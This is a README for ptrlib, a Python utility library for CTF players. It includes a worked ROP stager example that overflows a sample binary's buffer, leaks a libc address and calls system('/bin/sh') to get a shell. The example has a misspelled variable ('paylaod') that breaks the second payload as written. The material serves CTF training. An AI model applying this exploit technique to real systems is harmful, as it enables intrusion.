ptrlib
====

![Python application](https://github.com/ptr-yudai/ptrlib/workflows/Python%20application/badge.svg)

Python library which bundles security-related utilities.

## Description
Ptrlib is a Python library for CTF players.
It's designed to make it easy to write a complex program of cryptography, networking, exploit and so on.

## Requirements
Supports: Python 3.x

Library Dependency:
- pycryptodome
- pywin32 (If you want to handle Windows process)

External Program:
- If you want to use `SSH` function, the following programs are required:
  - ssh (Default path: `/usr/bin/ssh`)
  - expect (Default path: `/usr/bin/expect`)

## Usage
Basic examples are available at [/examples](https://bitbucket.org/ptr-yudai/ptrlib/src/master/examples/).

## Quick Document
There are many functions in ptrlib but let's see how to use it for pwn.
You can run executable or create socket like this:
```python
sock = Process("./pwn01")
sock = Process(["./pwn01", "--debug"])
sock = Socket("localhost", 1234)
sock = SSH("example.com", 22, username="ubuntu", password="p4s$w0rd")
sock = SSH("example.com", 22, username="ubuntu", identity="./id_rsa")
```
If you have the target binary or libc, it's recommended to load the binary first.
```python
elf = ELF("./pwn01")
libc = ELF("./libc.so.6")
```
And you can use useful methods such as `got`, `plt`, `symbol`, `section` and so on.
The following is the pwn example of ROP stager.
```python
plt_gets = elf.plt("gets")
stage2 = elf.section(".bss") + 0x400

payload = b'A' * 0x108
payload += flat([
  rop_pop_rdi,
  elf.got("puts"),
  elf.plt("puts"),
  rop_pop_rdi,
  stage2,
  elf.plt("gets"),
  rop_pop_rbp,
  stage2,
  rop_leave_ret
], map=p64)
sock.sendlineafter("Data: ", payload)

libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))
libc.set_base(libc_base)
payload = b'A' * 8
paylaod += p64(rop_pop_rdi)
payload += p64(next(libc.find("/bin/sh")))
payload += p64(libc.symbol("system"))
sock.sendline(payload)

sock.interactive()
```

## Install
Run `pip install ptrlib` or `python setup.py install`.

## Licence

[MIT](https://github.com/tcnksm/tool/blob/master/LICENCE)

## Author

[ptr-yudai](https://github.com/ptr-yudai)

## Contributor
Feel free to make a pull request / issue :)

- [theoremoon](https://github.com/theoremoon)
  - Added/fixed several cryptography functions
  - Added buffering of Socket/Process
  - Added status check (CI test)
- [keymoon](https://github.com/key-moon)
  - Added algorithm package
